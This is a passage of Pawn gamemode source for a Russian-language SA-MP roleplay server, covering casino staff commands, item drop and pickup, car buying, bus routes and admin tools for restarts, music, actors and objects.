		if(sscanf(params, "ii",params[0x0],params[0x1]) || (params[0x0] == playerid && params[0x0] > -1)) return SCM(playerid, -1, " Введите: /cinvite [playerid (-1 для увольнения)] [слот (0 - 9)]");
		if(params[0x0] > -1 && PlayerInfo[params[0x0]][pMember]) return SCM(playerid,COLOR_GREY," Этот человек состоит в организации!");
		switch(params[0x1])
		{
		case 0:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 1:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie2],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie2],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 2:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie3],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie3],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 3:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie4],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie4],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 4:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie5],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie5],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 5:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie6],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie6],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 6:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie7],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie7],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x6]][pName]), 32);
			}
		case 7:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie8],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie8],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 8:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie9],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie9],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 9:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie10],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie10],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		default: return SCM(playerid,COLOR_GREY," Неверный слот!");
		}
		SendMes(params[0x0], COLOR_BLUE, " %s назначил вас Крупье [%i]",PlayerInfo[playerid][pName],params[0x1]);
		SendMes(playerid, COLOR_BLUE, " Вы назначили %s Крупье [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
		printf("Игрок %s назначил %s крупье[%i] казино №%i", Name(playerid), Name(params[0]), params[1], i);
	}
	return true;
}
CMD:cinfo(playerid, params[])
{
	for(new i = 1; i <= TOTALCASINO; i++)
	{
		if(!PlayerToPoint(200,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
		new gaatext[24];
		switch(CasinoInfo[i][caMafia])
		{
		
		case 5: gaatext = "La Coca Nostra";
		case 6: gaatext = "Yakuza";
		case 14: gaatext = "Russian Mafia";
		}
		format(string, 500, "Казино: %s\n\nПод контролем: %s\n\n",CasinoInfo[i][caName],gaatext);
		format(string, 500, "%s\n\n[0] Менеджер: %s\n[1] Менеджер: %s\n[2] Менеджер: %s\n\n[0] Крупье: %s\n[1] Крупье: %s\n[2] Крупье: %s\n[3] Крупье: %s\n[4] Крупье: %s\n[5] Крупье: %s\n[6] Крупье: %s\n[7] Крупье: %s\n[8] Крупье: %s\n[9] Крупье: %s",string,CasinoInfo[i][caManager],CasinoInfo[i][caManager2],CasinoInfo[i][caManager3],CasinoInfo[i][caKrupie],CasinoInfo[i][caKrupie2],CasinoInfo[i][caKrupie3],CasinoInfo[i][caKrupie4],CasinoInfo[i][caKrupie5],
		CasinoInfo[i][caKrupie6],CasinoInfo[i][caKrupie7],CasinoInfo[i][caKrupie8],CasinoInfo[i][caKrupie9],CasinoInfo[i][caKrupie10]);
		ShowPlayerDialogEx(playerid,2145,DIALOG_STYLE_LIST,"Информация о Казино",string,"Закрыть","");
		break;
	}
	return true;
}
CMD:deal(playerid, params[])
{
	if(!GetPVarInt(playerid,"CasinoRank")) return true;
	if(GetPVarInt(playerid,"Roulet")) return SCM(playerid,COLOR_GREY," Вы уже запустили рулетку!");
	if(!GetRoulet(playerid)) return SCM(playerid,COLOR_GREY," В данном месте нет рулетки!");
	if(RouletPlay[GetRoulet(playerid)]) return SCM(playerid,COLOR_GREY," Рулетка уже запущена!");
	SetPVarInt(playerid,"Roulet",GetRoulet(playerid));
	RouletTimer[GetRoulet(playerid)][0x2] = random(80) + 70;
	RouletPlay[GetRoulet(playerid)] = true;
	RouletTimer[GetRoulet(playerid)][0x0] = SetTimerEx("RouletCheck",100,1,"d",GetRoulet(playerid));
	RouletKrupie[GetRoulet(playerid)] = playerid;
	return true;
}
CMD:pick(playerid, params[])
{
	new test = 0;
	for(new i = 0; i < SLOTVIBROS; i++)
	{
		if(PlayerToPoint(1.0,playerid,VibrosInfo[i][vX],VibrosInfo[i][vY],VibrosInfo[i][vZ]))
		{
			if(VibrosInfo[i][vModel] == 1)
			{
				if(PlayerInfo[playerid][pDrugs]+VibrosInfo[i][vKol] > 150)
				{
					SCM(playerid,COLOR_GREY," У вас не может быть больше 150 гр. наркотиков");
					break;
				}
				PlayerInfo[playerid][pDrugs]+=VibrosInfo[i][vKol];
				VibrosInfo[i][vModel] = 0;
				VibrosInfo[i][vTime] = -1;
				VibrosInfo[i][vX] = 0.0;
				VibrosInfo[i][vY] = 0.0;
				VibrosInfo[i][vZ] = 0.0;
				DestroyDynamic3DTextLabel(VibrosInfo[i][vPodnyat]);
				DestroyObject(VibrosInfo[i][vObject]);
				for(new ix = i; ix < SLOTVIBROS-1; ix++)
				{
					VibrosInfo[ix][vModel] = VibrosInfo[ix+1][vModel];
					VibrosInfo[ix][vTime] = VibrosInfo[ix+1][vTime];
					VibrosInfo[ix][vX] = VibrosInfo[ix+1][vX];
					VibrosInfo[ix][vY] = VibrosInfo[ix+1][vY];
					VibrosInfo[ix][vZ] = VibrosInfo[ix+1][vZ];
					DestroyDynamic3DTextLabel(VibrosInfo[ix+1][vPodnyat]);
					DestroyObject(VibrosInfo[ix+1][vObject]);
					if(VibrosInfo[ix][vModel] == 1)
					{
						VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Наркотики\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
						VibrosInfo[ix][vObject] = CreateObject(1485,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
					}
					else
					{
						VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Материалы\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
						VibrosInfo[ix][vObject] = CreateObject(1210,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
					}
				}
				SLOTVIBROS--;
				test++;
				SendMes(playerid,-1," Вы подняли %i грамм наркотиков",VibrosInfo[i][vKol]);
				break;
			}
			else if(VibrosInfo[i][vModel] == 2)
			{
				if(PlayerInfo[playerid][pMats]+VibrosInfo[i][vKol] > 500)
				{
					SCM(playerid,COLOR_GREY," У вас не может быть больше 500 материалов");
					break;
				}
				PlayerInfo[playerid][pMats]+=VibrosInfo[i][vKol];
				VibrosInfo[i][vModel] = 0;
				VibrosInfo[i][vTime] = -1;
				VibrosInfo[i][vX] = 0.0;
				VibrosInfo[i][vY] = 0.0;
				VibrosInfo[i][vZ] = 0.0;
				DestroyDynamic3DTextLabel(VibrosInfo[i][vPodnyat]);
				DestroyObject(VibrosInfo[i][vObject]);
				for(new ix = i; ix < SLOTVIBROS-1; ix++)
				{
					VibrosInfo[ix][vModel] = VibrosInfo[ix+1][vModel];
					VibrosInfo[ix][vTime] = VibrosInfo[ix+1][vTime];
					VibrosInfo[ix][vX] = VibrosInfo[ix+1][vX];
					VibrosInfo[ix][vY] = VibrosInfo[ix+1][vY];
					VibrosInfo[ix][vZ] = VibrosInfo[ix+1][vZ];
					DestroyDynamic3DTextLabel(VibrosInfo[ix+1][vPodnyat]);
					DestroyObject(VibrosInfo[ix+1][vObject]);
					if(VibrosInfo[ix][vModel] == 1)
					{
						VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Наркотики\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
						VibrosInfo[ix][vObject] = CreateObject(1485,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
					}
					else
					{
						VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Материалы\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
						VibrosInfo[ix][vObject] = CreateObject(1210,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
					}
				}
				SLOTVIBROS--;
				test++;
				SendMes(playerid,-1," Вы подняли %i материалов",VibrosInfo[i][vKol]);
				break;
			}
		}
	}
	if(test == 0) return SCM(playerid,COLOR_GREY," В данном месте нет объекта");
	return true;
}
CMD:drop(playerid, params[])
{
	if(sscanf(params, "s[32]", params[0]))
	{
		ShowPlayerDialogEx(playerid,1426,DIALOG_STYLE_LIST, "Выбросить:","Выбросить наркотики\nВыбросить материалы", "Выбор", "Выход");
		SCM(playerid, -1, " Введите: /drop [значение] (Наркотики/Материалы)");
		return true;
	}
	if(strcmp(params[0], "наркотики",true) == 0)
	{
		if(PlayerInfo[playerid][pDrugs] < 1) return SCM(playerid,COLOR_GREY," У вас нет наркотиков!");
		if(SLOTVIBROS >= 900) return SCM(playerid,COLOR_GREY," В данный момент нельзя выбросить что либо");
		new Float:Xw,Float:Yw,Float:Zw;
		VibrosInfo[SLOTVIBROS][vModel] = 1;
		VibrosInfo[SLOTVIBROS][vTime] = GetTickCount();
		GetPlayerPos(playerid,Xw,Yw,Zw);
		VibrosInfo[SLOTVIBROS][vX] = Xw;
		VibrosInfo[SLOTVIBROS][vY] = Yw;
		VibrosInfo[SLOTVIBROS][vZ] = Zw-0.9;
		VibrosInfo[SLOTVIBROS][vPodnyat] = CreateDynamic3DTextLabel("Наркотики\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[SLOTVIBROS][vX], VibrosInfo[SLOTVIBROS][vY], VibrosInfo[SLOTVIBROS][vZ], 10.0);
		VibrosInfo[SLOTVIBROS][vKol] = PlayerInfo[playerid][pDrugs];
		VibrosInfo[SLOTVIBROS][vObject] = CreateObject(1485,VibrosInfo[SLOTVIBROS][vX],VibrosInfo[SLOTVIBROS][vY],VibrosInfo[SLOTVIBROS][vZ],0.00,0.00,0.00);
		SCM(playerid,COLOR_GREY," Вы выбросили наркотики на землю!");
		PlayerInfo[playerid][pDrugs] = 0;
		SLOTVIBROS++;
	}
	else if(strcmp(params[0], "материалы",true) == 0)
	{
		if(PlayerInfo[playerid][pMats] < 1) return SCM(playerid,COLOR_GREY," У вас нет материалов!");
		if(SLOTVIBROS >= 900) return SCM(playerid,COLOR_GREY," В данный момент нельзя выбросить что либо");
		new Float:Xw,Float:Yw,Float:Zw;
		VibrosInfo[SLOTVIBROS][vModel] = 2;
		VibrosInfo[SLOTVIBROS][vTime] = GetTickCount();
		GetPlayerPos(playerid,Xw,Yw,Zw);
		VibrosInfo[SLOTVIBROS][vX] = Xw;
		VibrosInfo[SLOTVIBROS][vY] = Yw;
		VibrosInfo[SLOTVIBROS][vZ] = Zw-0.9;
		VibrosInfo[SLOTVIBROS][vPodnyat] = CreateDynamic3DTextLabel("Материалы\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[SLOTVIBROS][vX], VibrosInfo[SLOTVIBROS][vY], VibrosInfo[SLOTVIBROS][vZ], 10.0);
		VibrosInfo[SLOTVIBROS][vKol] = PlayerInfo[playerid][pMats];
		VibrosInfo[SLOTVIBROS][vObject] = CreateObject(1210,VibrosInfo[SLOTVIBROS][vX],VibrosInfo[SLOTVIBROS][vY],VibrosInfo[SLOTVIBROS][vZ],90.00,0.00,0.00);
		SCM(playerid,COLOR_GREY," Вы выбросили материалы на землю!");
		PlayerInfo[playerid][pMats] = 0;
		SLOTVIBROS++;
	}
	return true;
}
CMD:unlockallkvart(playerid,params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	for(new i = 1; i <= ALLKVARTIRI; i++) if(kvartinfo[i][lock] == 1) kvartinfo[i][lock] = 0;
	printf("Администратор %s открыл все квартиры");
	return true;
}
CMD:bmenu(playerid,params[])
{
	new i = PlayerInfo[playerid][pPBizzKey];
	if(PlayerToPoint(5, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]) || PlayerToPoint(5, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]))
	{
		if(!BGet(playerid)) return SCM(playerid, COLOR_GREY, " Вы не владеете бизнесом");
		format(YCMDstr, sizeof(YCMDstr), "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация");
		ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", YCMDstr, "Выбрать", "Отмена");
		return true;
	}
	return true;
}
CMD:painlist(playerid,params[])
{
	string = "";
	format(string,144,"\tИмя\t\t\tУбийств\t\t\tСмертей\n___________________________________________________________________\n");
	for(new i = 0; i < Painlist; i++) format(YCMDstr, sizeof(YCMDstr), "\t%s\t\t\t%i\t\t\t%i\n",PaintStats[i][paName],PaintStats[i][paKills],PaintStats[i][paDeaths]), strcat(string, YCMDstr);
	if(Painlist > 0) return ShowPlayerDialogEx(playerid, 11349, DIALOG_STYLE_MSGBOX, "Победители", string, "Готово", "");
	SCM(playerid,COLOR_GREY," Список игроков пуст");
	return true;
}
CMD:racelist(playerid,params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	string = "";
	if(RaceList == 0) return SCM(playerid,COLOR_GREY," Список пуст!");
	new null, str[100];
	for(new i = 0; i < RaceList; i++)
	{
		null++;
		format(str,64,"%i. %s\n",null,RaceInfo[i][rName]);
		strcat(string,str);
	}
	return ShowPlayerDialogEx(playerid,0, DIALOG_STYLE_MSGBOX, "Список победителей", string, "Готово", "");
}
stock restartServer(sw)
{
	if(sw == 1)
	{
		OOCOff(COLOR_RED, "");
		OOCOff(COLOR_RED, "");
		OOCOff(COLOR_RED, "");
		OOCOff(COLOR_RED, "");
		OOCOff(COLOR_RED, "  ----------------=======[ Внимание! Рестарт сервера через 30 секунд ]=======----------------");
		OOCOff(COLOR_RED, "");
		OOCOff(COLOR_RED, "");
		OOCOff(COLOR_RED, "");
		OOCOff(COLOR_RED, "");
	}
	SaveMySQL(0);
	for(new i = 1; i <= TOTALCASINO; i++) SaveMySQL(1,i);
	for(new i = 1; i <= TOTALSHOPS; i++) SaveMySQL(3,i);
	for(new i = 1; i <= TotalBizz; i++) SaveMySQL(4,i);
	for(new i = 1; i <= TotalHouse; i++) SaveMySQL(5,i);
	for(new i = 1; i <= ALLKVARTIRI; i++) SaveMySQL(6,i);
	for(new i = 1; i <= AllPODEZD; i++) SaveMySQL(7,i);
	for(new i = 1; i <= TOTALATM; i++) SaveMySQL(8,i);
	for(new i = 0; i <= TOTALFARM; i++) SaveMySQL(9,i);
	mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pLogin = '0'");
	mysql_function_query(DATABASE,QUERY,false,"","");
	rr = 1;
	if(sw == 1)
	{
		foreach(i)
		{
			GameTextForPlayer(i,"~r~RESTART", 1000, 0);
			ShowPlayerDialogEx(i,556,DIALOG_STYLE_MSGBOX,"{D95A41}Рестарт сервера","{D95A41}В данный момент проходит рестарт сервера\nПерезайдите через минуту","ENTER","");
			Kick(i);
		}
	}
	else
	{
	    foreach(i)
		{
			GameTextForPlayer(i,"~r~RESTART", 1000, 0);
   			SaveMySQL(2, i);
		}
	}
	SetTimer("gmx_command", 10000, true);
	
	return true;
}
publics: gmx_command()
{
    SendRconCommand("gmx");
    return false;
}
CMD:rr(playerid, params[])
{
	if (PlayerInfo[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	printf("Администратор %s запустил рестарт сервера (/rr)", Name(playerid));
 	restartServer(1);
	return true;
}
CMD:gmx(playerid, params[])
{
	if (PlayerInfo[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	printf("Администратор %s запустил рестарт сервера (/gmx)", Name(playerid));
	restartServer(0);
	return true;
}
CMD:restart(playerid)
{
	if(PlayerInfo[playerid][pAdmin] < 8) return true;
	if(serverRestart) serverRestart = false, SCM(playerid, COLOR_REDD, " Плановый рестарт сервера отключён"), printf("Администратор %s отключил плановый рестарт сервера", Name(playerid));
	else serverRestart = true, SCM(playerid, COLOR_GREEN, " Плановый рестарт сервера включён"), printf("Администратор %s включил плановый рестарт сервера", Name(playerid));
	return true;
}
CMD:clearreconnect(playerid,params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	ClearReconnect();
	SCM(playerid,-1," Reconnect лист очищен");
	printf("Администратор %s очистил Reconnect-list", Name(playerid));
	return true;
}
CMD:setallbizint(playerid,params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(BizzInfo[i][bType] == 3)
		{
			BizzInfo[i][bInterior] = 6;
			BizzInfo[i][bExitX] = -2240.4685;
			BizzInfo[i][bExitY] = 137.0604;
			BizzInfo[i][bExitZ] = 1035.4140;
			BizzInfo[i][bBarX] = -2236.1130;
			BizzInfo[i][bBarY] = 130.1580;
			BizzInfo[i][bBarZ] = 1035.4141;
			DestroyDynamicPickup(BizzInfo[i][bExitPic]);
			BizzInfo[i][bExitPic] = CreatePickupAC(19132, 23, BizzInfo[i][bExitX], BizzInfo[i][bExitY], BizzInfo[i][bExitZ],BizzInfo[i][bVirtualWorld]);
		}
	}
	SCM(playerid,-1," Бизнесы по интерьерам распределены");
	printf("Администратор %s респределил интерьеры по бизнесами", Name(playerid));
	return true;
}
CMD:buycar(playerid, params[])
{
	if(PlayerInfo[playerid][pCarLic] != 1) return SCM(playerid,-1, " У вас нет Лицензии на управление авто");
	if(!HGet(playerid) && !KGet(playerid)) return SCM(playerid,COLOR_GREY, " Вы не имеете дома!");
	if(IsPlayerInRangeOfPoint(playerid,5.0, 562.2836,-1291.9972,17.2482))
	{
		SetPVarInt(playerid,"AutoShop",1);
		SetPVarInt(playerid, "CarShop", 0);//nope
		SetPVarInt(playerid, "SelectAvto", 0);
		return ShowBuyCar(playerid);
	}
	else if(IsPlayerInRangeOfPoint(playerid,5.0, -1951.2544,293.6375,35.4688))
	{
		SetPVarInt(playerid,"AutoShop",2);
		return ShowPlayerDialogEx(playerid,14009,0," ","Выберите класс машин","C","D");
	}
	else if(IsPlayerInRangeOfPoint(playerid,5.0, -1657.7015,1210.2267,7.2500))
	{
		SetPVarInt(playerid,"AutoShop",3);
		return ShowPlayerDialogEx(playerid,14009,0," ","Выберите класс машин","A","B");
	}
	else if(IsPlayerInRangeOfPoint(playerid,5.0, 2200.8857,1394.2892,11.0625))
	{
		SetPVarInt(playerid,"AutoShop",4);
		return ShowPlayerDialogEx(playerid,14009,0," ","Выберите класс машин","A","B");
	}
	else SCM(playerid,-1," Вы не в месте продажи автомобилей!");
	return 1;
}
CMD:setspa(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /setspa [playerid] [значение]");
	SetPlayerSpecialAction (params[0],params[1]);
	printf("Администратор %s установил %s spec.action %i", Name(playerid), Name(params[0]), params[1]);
	return true;
}
CMD:thefskill(playerid)
{
	format(YCMDstr,sizeof(YCMDstr), " Ваш опыт Автоугонщика: %i / 1000", PlayerInfo[playerid][pSkilla]);
	SCM(playerid,COLOR_BLUE,YCMDstr);
	return 1;
}
CMD:route(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 1) return SCM(playerid, COLOR_GREY, " Вы не водитель автобуса");
	if(GetPlayerState(playerid) != 2) return true;
	new carid = GetPlayerVehicleID(playerid);
	if((carid >= buscar[0] && carid <= buscar[1]) || (carid >= buscar[2] && carid <= buscar[3]) || (carid >= buscar[4] && carid <= buscar[5]) || (carid >= buscar[6] && carid <= buscar[7]))
	{
		if(GetPVarInt(playerid, "TypeBus") > 0)
		{
			ShowPlayerDialogEx(playerid,8128,DIALOG_STYLE_MSGBOX, " ", "Вы уверены что хотите завершить свой рабочий день?!", "Завершить", "Отмена");
			return true;
		}
		if(GetPlayerVehicleID(playerid) >= buscar[0] && GetPlayerVehicleID(playerid) <= buscar[1]) ShowPlayerDialogEx(playerid,1745,DIALOG_STYLE_MSGBOX," ","Начать работу водителя автобуса?", "Да", "Нет");
		else if(GetPlayerVehicleID(playerid) >= buscar[2] && GetPlayerVehicleID(playerid) <= buscar[3]) ShowPlayerDialogEx(playerid,1745,DIALOG_STYLE_MSGBOX," ","Начать работу водителя автобуса?", "Да", "Нет");
		else if(GetPlayerVehicleID(playerid) >= buscar[4] && GetPlayerVehicleID(playerid) <= buscar[5]) ShowPlayerDialogEx(playerid,1745,DIALOG_STYLE_MSGBOX," ","Начать работу водителя автобуса?", "Да", "Нет");
		else ShowPlayerDialogEx(playerid, 163, 2, "Маршрут", "АвтоВокзал LS << >> Автошкола SF\nАвтоВокзал LS << >> АвтоВокзал LV", "Принять", "Отмена");
		printf("Игрок %s начал маршрут водителем автобуса", Name(playerid));
	}
	else SCM(playerid, COLOR_GREY, " Вы должны находиться в автобусе!");
	return true;
}
CMD:amusic(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	new nonf;
	if(sscanf(params, "f",nonf)) return SCM(playerid, -1, " Введите: /amusic [радиус 1 - 300 или 0 - выключить] [ссылка]");
	if(nonf == 0)
	{
		Sounds = 0;
		foreach(i)
		{
			StopAudioStreamForPlayer(i); // Stop the audio stream
			UseSound[i] = 0;
		}
		return SCM(playerid, 0xFF0000AA, " Музыка отключена");
	}
	new path[150];
	if(sscanf(params, "ds[150]",params[0],path)) return SCM(playerid, -1, " Введите: /amusic [радиус 1 - 300 или 0 - выключить] [ссылка]");
	if(params[0] < 1 || params[0] > 300) return SCM(playerid, COLOR_GREY," От 1 до 300");
	format(stream, sizeof(stream),"%s",path);
	rads = params[0];
	Sounds = 1;
	new Float:x1,Float:y1,Float:z1;
	GetPlayerPos(playerid,x1,y1,z1);
	streampos[0] = x1;
	streampos[1] = y1;
	streampos[2] = z1;
	foreach(i)
	{
		UseSound[i] = 0;
	}
	SCM(playerid, COLOR_GREEN, " Музыка включена"); //http://radiopotok.ru/f/m3u/station_4.m3u
	printf("Администратор %s добавил музыку в радиус %i [%s]", PlayerInfo[playerid][pName], params[0], path);
	return 1;
}
CMD:actor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	new slot, skinid, Float:hpact, bibl[32], idanim[32], repeat;
	if(sscanf(params, "ddfs[32]s[32]d", slot, skinid, hpact, bibl, idanim, repeat)) return SCM(playerid, -1, " /actor [слот] [скин] {C0C0C0}[хп] [аним.библиотека] [аним.ид] [повторять]");
	if(SlotActor[slot] == 0 || SlotActor[slot] == INVALID_ACTOR_ID)
	{
	    new Float:x1, Float:y1, Float:z1, Float:face, vw;
	    GetPlayerPos(playerid, x1, y1, z1);
		GetPlayerFacingAngle(playerid, face);
		vw = GetPlayerVirtualWorld(playerid);
	    SlotActor[slot] = CreateActor(skinid, x1,y1,z1,face);
	    SetActorVirtualWorld(SlotActor[slot], vw);
		SetActorHealth(SlotActor[slot], hpact);
		ApplyActorAnimation(SlotActor[slot], bibl, idanim,4.1,repeat,0,0,1,0);
		SCM(playerid, -1, " Бот установлен");
		SetPlayerPos(playerid, x1+2, y1, z1);
		printf("Администратор %s добавил бота [%i]", Name(playerid), slot);
	}
	return true;
}
CMD:delactor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /delactor [слот]");
	if(SlotActor[params[0]] != 0 || SlotActor[params[0]] != INVALID_ACTOR_ID)
	{
	    DestroyActor(SlotActor[params[0]]);
		SlotActor[params[0]] = 0;
		SCM(playerid, -1, " Бот удалён");
		printf("Администратор %s удалил бота [%i]", Name(playerid), params[0]);
	}
	return true;
}
CMD:hbjectid(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /hbjectid [object slot]");
	if(IsPlayerAttachedObjectSlotUsed(playerid, params[0])) EditAttachedObject(playerid, params[0]);
	return true;
}
CMD:hbject(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new giveplayerids = -1, slot = -1, objectid = -1, bone = -1, Float:oX, Float:oY, Float:oZ, Float:rX, Float:rY, Float:rZ, Float:sX, Float:sY, Float:sZ;
	if(sscanf(params, "uddd", giveplayerids, slot, objectid, bone))return SCM(playerid, -1, " Введите: /hbject [playerid] [слот 0-9] [id объект] [1-18]  [x][y][z]  [rx][ry][rz] [sx][sy][sz]");
	if(sscanf(params, "udddfffffffff", giveplayerids, slot, objectid, bone, oX, oY, oZ, rX, rY, rZ, sX, sY, sZ)) 
	{
	    oX = oY = oZ = rX = rY = rZ = 0; sX = sY = sZ = 1.0;
	}
	if(IsPlayerAttachedObjectSlotUsed(giveplayerids, slot)) return RemovePlayerAttachedObject(giveplayerids, slot), SCM(playerid, -1, "Объект удален");
	SetPlayerAttachedObject(giveplayerids, slot, objectid, bone, oX, oY, oZ, rX, rY, rZ, sX, sY, sZ);
	printf("Администратор %s выдал %s объект %i", Name(playerid), Name(giveplayerids), objectid);
	return true;
}
CMD:getobjectpos(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new Float:x1,Float:y1,Float:z1;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /getobjectpos [Слот]");
	GetObjectPos(SlotObject[params[0]],x1,y1,z1);
	format(string, 128, " GetDynamicObjectPos %f,%f,%f",x1,y1,z1);
	SCM(playerid,COLOR_GREY,string);
	printf("Администратор %s получил позицию объекта slot%i", Name(playerid), params[0]);
	return true;
}
CMD:obj(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6 || dostup[playerid] == 0) return 1;
	if(sscanf(params, "dd", params[0],params[1])) return SCM(playerid, -1, " Введите: /obj [слот] [id объекта]");
	if(SlotObject[params[0]] != 0) return SCM(playerid, COLOR_GREY, " Слот занят!");
	new Float:x1,Float:y1,Float:z1;
	GetPlayerPos(playerid,x1,y1,z1);
	SlotObject[params[0]] = CreateDynamicObject(params[1],x1,y1,z1,0.00,0.00,0.00);
